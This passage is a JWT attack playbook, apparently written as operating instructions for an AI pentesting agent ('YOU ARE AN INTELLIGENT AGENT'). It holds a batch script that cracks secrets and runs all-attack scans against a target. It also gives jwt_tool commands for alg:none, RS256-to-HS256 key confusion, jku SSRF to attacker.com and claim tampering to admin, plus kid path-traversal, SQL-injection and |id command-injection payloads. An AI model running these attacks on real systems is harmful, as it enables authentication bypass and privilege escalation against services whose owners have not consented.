# Compare responses
# Original token â†’ 403 Forbidden
# Forged token â†’ 200 OK = VULNERABLE! ğŸ¯

================================================================================
PHASE 7: AUTOMATED FULL SCAN
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.1 jwt_tool All Attacks Mode
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Run ALL automated tests
jwt_tool <TOKEN> -M at -t "https://target.com/api/profile" -rh "Authorization: Bearer"

# Options breakdown:
# -M at      = All Tests mode
# -t         = Target URL to test against
# -rh        = Request header format

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.2 Batch Processing Multiple Tokens
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# jwt_batch_scan.sh

TOKENS_FILE="$1"
TARGET="$2"
OUTPUT_DIR="outputs/jwt_attacks"

mkdir -p "$OUTPUT_DIR"

while read -r token; do
    echo "[*] Analyzing token..."
    
    # Decode
    jwt_tool "$token" >> "$OUTPUT_DIR/token_analysis.json"
    
    # Algorithm attacks
    jwt_tool "$token" -X a >> "$OUTPUT_DIR/algorithm_confusion.txt" 2>&1
    
    # Crack with wordlist
    jwt_tool "$token" -C -d jwt_wordlist_custom.txt >> "$OUTPUT_DIR/cracked_secrets.txt" 2>&1
    
    # Full scan against target
    jwt_tool "$token" -M at -t "$TARGET" >> "$OUTPUT_DIR/full_scan.txt" 2>&1
    
done < "$TOKENS_FILE"

echo "[+] Scan complete. Results in $OUTPUT_DIR"

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================
JWT attacks require methodical analysis and contextual exploitation.

BEFORE ATTACKING:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. EXTRACT tokens from ALL sources (HAR, cookies, JS, responses)
2. DECODE each token to understand structure
3. IDENTIFY the algorithm (HS256 vs RS256 changes attack path)
4. NOTE claims that control access (role, admin, sub)
5. FIND where public key might be exposed (.well-known/jwks.json)

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                  â”‚ Why First?                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ alg: none               â”‚ Instant win if vulnerable             â”‚
â”‚ 2        â”‚ HS256/RS256 confusion   â”‚ No secret needed if RS256 â†’ HS256     â”‚
â”‚ 3        â”‚ kid injection           â”‚ Path traversal to /dev/null = empty   â”‚
â”‚ 4        â”‚ jku/x5u SSRF            â”‚ Point to attacker JWKS                â”‚
â”‚ 5        â”‚ Secret cracking         â”‚ Try if symmetric (HS256)              â”‚
â”‚ 6        â”‚ Claim tampering         â”‚ After any successful bypass           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CONTEXTUAL DECISIONS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
IF alg is RS256:
  â†’ Try RS256â†’HS256 confusion with public key
  â†’ Look for public key at /.well-known/jwks.json
  â†’ Extract from TLS certificate: openssl s_client -connect host:443
  
IF alg is HS256:
  â†’ Focus on secret cracking
  â†’ Try common wordlists first (fast)
  â†’ Generate company-specific wordlist
  â†’ Use hashcat for GPU acceleration if large wordlist

IF kid header present:
  â†’ Path traversal: ../../dev/null
  â†’ SQLi: ' OR '1'='1
  â†’ Command injection: |id

IF jku/x5u header present:
  â†’ SSRF to your server
  â†’ Start Interactsh: interactsh-client
  â†’ Host your JWKS

SIGNS OF VULNERABILITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
âœ“ Token accepted with different algorithm
âœ“ Token accepted without signature (alg: none)
âœ“ Server fetches URL from jku/x5u
âœ“ Error messages reveal key operations
âœ“ Short/weak secret cracked

VERIFICATION CHECKLIST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Forged token returns 200 instead of 401/403
â–¡ Response contains elevated data (admin panel, other users)
â–¡ Can access endpoints that original token couldn't
â–¡ Can perform actions that original token couldn't

================================================================================
COMMON MISTAKES TO AVOID
================================================================================
âŒ Not trying ALL algorithm variations (none, None, NONE, nOnE)
âŒ Forgetting trailing dot for alg:none (header.payload.)
âŒ Not looking for public key before RS256â†’HS256 attack
âŒ Using rockyou.txt before JWT-specific wordlists
âŒ Not generating company-specific wordlist
âŒ Missing kid injection when header present
âŒ Not verifying forged token actually works

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ All JWT tokens extracted and catalogued
âœ“ Each token analyzed for vulnerabilities
âœ“ Algorithm confusion attacks attempted
âœ“ Header injection attacks attempted (kid/jku/x5u)
âœ“ Secret cracking attempted with optimized wordlists
âœ“ Successful bypasses documented with forged tokens
âœ“ Privilege escalation verified on protected endpoints

================================================================================
QUICK REFERENCE: jwt_tool COMMANDS
================================================================================
# Decode token
jwt_tool <TOKEN>

# Algorithm none attack
jwt_tool <TOKEN> -X a

# Key confusion (RS256 â†’ HS256)
jwt_tool <TOKEN> -X k -pk public_key.pem

# jku SSRF
jwt_tool <TOKEN> -X s -ju "https://attacker.com/jwks.json"

# kid injection
jwt_tool <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Crack secret
jwt_tool <TOKEN> -C -d wordlist.txt

# Modify claims
jwt_tool <TOKEN> -I -pc role -pv admin -S hs256 -p "secret"

# All attacks mode
jwt_tool <TOKEN> -M at -t "https://target.com/api"

# Generate new keypair
jwt_tool -nk -nkp mykey

================================================================================
WORDLIST LOCATIONS (MUST HAVE)
================================================================================
# SecLists JWT wordlist (BEST)
/usr/share/seclists/Passwords/JWT/jwt-secrets.txt

# Common passwords (fallback)
/usr/share/wordlists/rockyou.txt

# Custom generated (TARGET-SPECIFIC)
jwt_wordlist_custom.txt

# Create combined optimized wordlist:
cat seclists_jwt.txt custom_company.txt common_patterns.txt | sort -u > jwt_master_wordlist.txt

